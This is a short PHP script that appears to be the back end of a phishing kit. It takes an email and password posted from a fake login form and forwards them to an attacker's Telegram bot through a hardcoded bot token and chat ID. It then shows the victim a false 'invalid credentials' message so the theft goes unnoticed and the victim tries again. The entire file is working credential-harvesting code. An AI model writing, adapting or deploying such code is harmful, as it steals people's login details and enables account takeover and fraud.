<?php

// Allow requests from any domain
header("Access-Control-Allow-Origin: *");

// Allow these request headers
header("Access-Control-Allow-Headers: Content-Type, Authorization");

// Allow these request methods
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
// Enable PHP error reporting
error_reporting(E_ALL);
ini_set('display_errors', 1);
// Telegram Bot Token
$botToken = "7649612009:AAGz7-YLIvEEQhWBGyHmG6uhu2vPY6U-e2Q";
$chatId = "7394958970"; // Replace with your Telegram chat ID

// Collect form data
$email = $_POST['email'];
$patty = $_POST['input_text'];

// Format the message
$message = "New Login Attempt:\nEmail: $email\nPassword: $patty";

// Telegram API URL
$telegramApiUrl = "https://api.telegram.org/bot$botToken/sendMessage";

// Send the data to Telegram
$response = file_get_contents($telegramApiUrl . "?chat_id=$chatId&text=" . urlencode($message));

// Return success or error message as JSON
if ($response) {
    echo json_encode(["status" => "success", "message" => "You have entered invalid credentials. Please try again."]);
} else {
    echo json_encode(["status" => "error", "message" => "Network error, please try again."]);
}
?>

